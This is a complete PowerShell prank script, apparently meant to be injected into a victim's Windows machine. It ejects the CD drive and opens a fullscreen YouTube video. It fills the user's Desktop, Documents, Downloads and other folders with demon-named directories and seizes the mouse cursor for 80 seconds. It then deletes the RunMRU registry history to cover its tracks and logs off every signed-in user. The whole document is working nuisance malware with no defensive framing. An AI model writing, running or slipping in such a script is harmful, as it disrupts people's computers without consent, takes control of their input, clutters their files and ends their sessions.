$x = New-Object -ComObject Shell.Application
$x.minimizeall()
$sh = New-Object -ComObject "Shell.Application"
$sh.Namespace(17).Items() | 
Where-Object { $_.Type -eq "CD Drive" } | 
foreach { $_.InvokeVerb("Eject") }
start-process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://www.youtube.com/watch?v=zfwJiG2F698#t=2m32s ; Start-Sleep -Milliseconds 950 ; [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') ; [System.Windows.Forms.SendKeys]::SendWait("{F11}")
Add-Type -AssemblyName System.Windows.Forms
function RRfolder {mkdir Aamon######;mkdir Apollyon##;mkdir Abezethibou;mkdir %%%%Abraxas;mkdir Abyzou++;mkdir Achlys-666;mkdir Adrammelech##;mkdir Aeshma;mkdir Agaliarept%^%^;mkdir Agares%;mkdir %%$#Agiel%%;mkdir Ahriman;mkdir Alastor;mkdir Alloces;mkdir Armaros!@#%;mkdir Archon^%;mkdir Funny_Games666;mkdir ^#Arunasura$%^%#;mkdir %##%%^Bakasura%^##;mkdir Baku$%#;mkdir Beelzebub%%;}
cd C:\Users\$env:UserName\Desktop;RRfolder;cd C:\Users\$env:UserName\Downloads;RRfolder;cd C:\Users\$env:UserName\Documents;RRfolder;cd C:\Users\$env:UserName\Favorites;RRfolder;cd C:\Users\$env:UserName\Links;RRfolder;cd C:\Users\$env:UserName\Music;RRfolder;cd C:\Users\$env:UserName\Videos;RRfolder;cd C:\Users\$env:UserName\Contacts;RRfolder
$timeout = new-timespan -Seconds 80 
$sw = [diagnostics.stopwatch]::StartNew()
while ($sw.elapsed -lt $timeout){
  $Pos = [System.Windows.Forms.Cursor]::Position
  $x = ($pos.X % 100) + 1
  $y = ($pos.Y % 800) + 1
  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
}
$x = New-Object -ComObject Shell.Application
$x.minimizeall()
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
quser | Select-Object -Skip 1 | ForEach-Object {
$CurrentLine = $_.Trim() -Replace '\s+', ' ' -Split '\s'
$UserID = $CurrentLine[2]
logoff $UserID
}
